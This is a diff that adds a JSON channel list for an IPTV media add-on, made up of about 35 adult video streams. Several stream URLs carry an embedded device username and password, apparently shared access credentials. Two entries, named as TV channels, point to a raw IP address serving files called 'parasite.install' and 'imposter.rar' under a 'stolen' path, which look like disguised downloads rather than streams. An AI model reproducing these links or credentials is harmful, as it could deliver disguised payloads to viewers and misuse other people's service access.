@@ -1,0 +1,215 @@
+{
+  "isIPTV": 1,
+  "links": [
+    {
+      "ID": 0,
+      "Name": "HDBRUNETTE",
+      "Link": "http://cdn.adultiptv.net/brunette.m3u8",
+      "Image": "media/iptv.png"
+    },
+    {
+      "ID": 1,
+      "Name": "HDGAY",
+      "Link": "http://cdn.adultiptv.net/gay.m3u8",
+      "Image": "http://beytepe.tk/sey/kodi/media/iptv.png"
+    },
+    {
+      "ID": 2,
+      "Name": "HDTEEN",
+      "Link": "http://live.redtraffic.xyz/teen.m3u8",
+      "Image": "http://beytepe.tk/sey/kodi/media/iptv.png"
+    },
+    {
+      "ID": 3,
+      "Name": "Hustler HD",
+      "Link": "http://x-bosna.no-ip.biz:80/live.ts?channelId=148&deviceUser=MamaTata&devicePass=hwVv4Mb5yarbaGHAIfET&uid=491",
+      "Image": "http://beytepe.tk/sey/kodi/media/iptv.png"
+    },
+    {
+      "ID": 4,
+      "Name": "VIVID RED HD - VIVID RED HD",
+      "Link": "http://x-bosna.no-ip.biz:80/live.ts?channelId=150&deviceUser=MamaTata&devicePass=hwVv4Mb5yarbaGHAIfET&uid=491",
+      "Image": "http://beytepe.tk/sey/kodi/media/iptv.png"
+    },
+    {
+      "ID": 5,
+      "Name": "BRAZZERS - BRAZZERS",
+      "Link": "http://x-bosna.no-ip.biz:80/live.ts?channelId=147&deviceUser=MamaTata&devicePass=hwVv4Mb5yarbaGHAIfET&uid=491",
+      "Image": "http://beytepe.tk/sey/kodi/media/iptv.png"
+    },
+    {
+      "ID": 6,
+      "Name": "DORCEL TV - DORCEL TV",
+      "Link": "http://x-bosna.no-ip.biz:80/live.ts?channelId=149&deviceUser=MamaTata&devicePass=hwVv4Mb5yarbaGHAIfET&uid=491",
+      "Image": "http://beytepe.tk/sey/kodi/media/iptv.png"
+    },
+    {
+      "ID": 7,
+      "Name": "PRIVATE TV - PRIVATE TV",
+      "Link": "http://x-bosna.no-ip.biz:80/live.ts?channelId=151&deviceUser=MamaTata&devicePass=hwVv4Mb5yarbaGHAIfET&uid=491",
+      "Image": "http://beytepe.tk/sey/kodi/media/iptv.png"
+    },
+    {
+      "ID": 8,
+      "Name": "DUSK TV - DUSK TV",
+      "Link": "http://x-bosna.no-ip.biz:80/live.ts?channelId=152&deviceUser=MamaTata&devicePass=hwVv4Mb5yarbaGHAIfET&uid=491",
+      "Image": "http://beytepe.tk/sey/kodi/media/iptv.png"
+    },
+    {
+      "ID": 9,
+      "Name": "XXL - XXL",
+      "Link": "http://x-bosna.no-ip.biz:80/live.ts?channelId=307&deviceUser=MamaTata&devicePass=hwVv4Mb5yarbaGHAIfET&uid=491",
+      "Image": "http://beytepe.tk/sey/kodi/media/iptv.png"
+    },
+    {
+      "ID": 10,
+      "Name": "Super One HD",
+      "Link": "http://188.35.9.5:10007/stolen/246r/parasite.install",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 11,
+      "Name": "Private TV HD",
+      "Link": "http://188.35.9.5:10005/stolen/153a/imposter.rar",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 12,
+      "Name": "AdultIPTV.net Live Cams",
+      "Link": "http://cdn.adultiptv.net/livecams.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 13,
+      "Name": "AdultIPTV.net Anal",
+      "Link": "http://cdn.adultiptv.net/anal.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 14,
+      "Name": "AdultIPTV.net Big Ass",
+      "Link": "http://cdn.adultiptv.net/bigass.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 15,
+      "Name": "AdultIPTV.net Big Dick",
+      "Link": "http://cdn.adultiptv.net/bigdick.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 16,
+      "Name": "AdultIPTV.net Big Tits",
+      "Link": "http://cdn.adultiptv.net/bigtits.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 17,
+      "Name": "AdultIPTV.net Blonde",
+      "Link": "http://cdn.adultiptv.net/blonde.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 18,
+      "Name": "AdultIPTV.net Blowjob",
+      "Link": "http://cdn.adultiptv.net/blowjob.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 19,
+      "Name": "AdultIPTV.net Brunette",
+      "Link": "http://cdn.adultiptv.net/brunette.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 20,
+      "Name": "AdultIPTV.net Compilation",
+      "Link": "http://cdn.adultiptv.net/compilation.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 21,
+      "Name": "AdultIPTV.net Cuckold",
+      "Link": "http://cdn.adultiptv.net/cuckold.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 22,
+      "Name": "AdultIPTV.net Fetish",
+      "Link": "http://cdn.adultiptv.net/fetish.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 23,
+      "Name": "AdultIPTV.net Gangbang",
+      "Link": "http://cdn.adultiptv.net/gangbang.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 24,
+      "Name": "AdultIPTV.net Gay",
+      "Link": "http://cdn.adultiptv.net/gay.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 25,
+      "Name": "AdultIPTV.net Hardcore",
+      "Link": "http://cdn.adultiptv.net/hardcore.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 26,
+      "Name": "AdultIPTV.net Interracial",
+      "Link": "http://cdn.adultiptv.net/interracial.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 27,
+      "Name": "AdultIPTV.net Latina",
+      "Link": "http://cdn.adultiptv.net/latina.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 28,
+      "Name": "AdultIPTV.net Lesbian",
+      "Link": "http://cdn.adultiptv.net/lesbian.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 29,
+      "Name": "AdultIPTV.net MILF",
+      "Link": "http://cdn.adultiptv.net/milf.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 30,
+      "Name": "AdultIPTV.net Pornstar",
+      "Link": "http://cdn.adultiptv.net/pornstar.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 31,
+      "Name": "AdultIPTV.net POV",
+      "Link": "http://cdn.adultiptv.net/pov.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 32,
+      "Name": "AdultIPTV.net Rough",
+      "Link": "http://cdn.adultiptv.net/rough.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 33,
+      "Name": "AdultIPTV.net Russian",
+      "Link": "http://cdn.adultiptv.net/russian.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    },
+    {
+      "ID": 34,
+      "Name": "AdultIPTV.net Teen",
+      "Link": "http://cdn.adultiptv.net/teen.m3u8",
+      "Image": "http://adultiptv.net/lists/logo.png"
+    }
+  ]
+}
